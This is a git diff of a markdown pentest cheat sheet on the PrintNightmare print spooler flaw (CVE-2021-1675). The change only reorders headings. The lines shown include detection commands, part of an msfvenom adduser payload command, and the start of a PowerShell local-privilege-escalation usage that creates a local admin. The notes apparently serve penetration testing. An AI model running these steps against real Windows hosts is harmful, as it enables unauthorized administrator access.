@@ -1,4 +1,6 @@
-# Vulnerability Detection (Remote)
+# RCE Version [Github](https://github.com/cube0x0/CVE-2021-1675)
+
+## Vulnerability Detection (Remote)
 When running:
 ```bash
 rpcdump.py @<VICTIM_IP> | egrep 'MS-RPRN|MS-PAR'
@@ -9,8 +11,6 @@ rpcdump.py @<VICTIM_IP> | egrep 'MS-RPRN|MS-PAR'
 Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
 Protocol: [MS-RPRN]: Print System Remote Protocol
 ```
-
-# RCE Version [Github](https://github.com/cube0x0/CVE-2021-1675)
 
 ## Installation
 ```bash
@@ -61,7 +61,9 @@ msfvenom -p windows/adduser USER=<USERNAME> PASS=<PASSWORD_MATCHING_COPLEXITY> -
 
 ---
 
-# Vulnerability Detection (Local)
+# LPE Version [Github](https://github.com/calebstewart/CVE-2021-1675)
+
+## Vulnerability Detection
 When runnnig:
 ```shell
 REG QUERY "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
@@ -78,7 +80,6 @@ HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint
 gsv spooler
 ```
 
-# LPE Version [Github](https://github.com/calebstewart/CVE-2021-1675)
 ## Usage (Creating Local Admin)
 ```
 Import-Module .\cve-2021-1675.ps1
